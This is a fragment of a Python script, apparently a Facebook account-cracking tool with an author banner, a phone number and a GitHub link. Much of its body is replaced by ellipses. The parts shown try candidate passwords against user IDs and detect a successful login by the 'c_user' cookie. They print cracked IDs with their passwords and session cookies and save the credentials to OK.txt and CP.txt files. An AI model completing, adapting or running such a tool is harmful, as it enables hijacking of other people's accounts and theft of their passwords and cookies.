...
#CREATE BY : ༄ᴹᴿ༒Dєvíℓᬊᬁ

#WHATSAPP : +8801953426804

#GITHUB : https://github.com/Exdevilex
...
def fuck():
    ...
    print(' [+] OK Ids saved in ༄ᴹᴿ༒Dєvíℓᬊᬁ/OK.txt')

    print(' [+] CP Ids saved in ༄ᴹᴿ༒Dєvíℓᬊᬁ/CP.txt')
...
def mumit2(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[༄ᴹᴿ༒Dєvíℓᬊᬁ]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[1;92m[༄ᴹᴿ༒Dєvíℓᬊᬁ-OK] {uid}|{ps} \nCookie : {coki}")

                open('/sdcard/༄ᴹᴿ༒Dєvíℓᬊᬁ/OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print(f"\033[1;94m[༄ᴹᴿ༒Dєvíℓᬊᬁ-CP] {cid}|{ps}")

                open('/sdcard/༄ᴹᴿ༒Dєvíℓᬊᬁ-CP.txt', 'a').write( uid+' | '+ps+' \n')
